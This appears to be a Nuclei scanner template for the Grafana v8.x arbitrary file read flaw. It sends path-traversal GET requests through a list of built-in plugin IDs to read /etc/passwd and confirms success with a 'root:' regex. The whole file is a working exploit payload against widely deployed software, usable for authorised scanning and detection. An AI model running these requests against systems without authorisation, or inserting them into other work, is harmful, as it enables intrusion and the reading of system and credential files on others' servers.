id: grafana-file-read

info:
  name: Grafana v8.x Arbitrary File Read
  author: z0ne
  severity: high
  tags: grafana,lfi
  reference:
    - https://twitter.com/pyn3rd/status/1468138032477859841
    - https://nosec.org/home/detail/4914.html

requests:
  - method: GET
    path:
      - "{{BaseURL}}/public/plugins/{{plugin-id}}/../../../../../../../../../../../../../../../../../../../etc/passwd"

    payloads:
      plugin-id:
        - grafana-clock-panel
        - alertlist
        - graph
        - elasticsearch
        - dashlist
        - cloudwatch
        - mysql
        - influxdb
        - heatmap
        - graphite
        - prometheus
        - postgres
        - pluginlist
        - opentsdb
        - text
        - table
        - stackdriver
        - grafana-azure-monitor-datasource
        - grafana-simple-json-datasource

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: regex
        regex:
          - "root:.*:0:0:"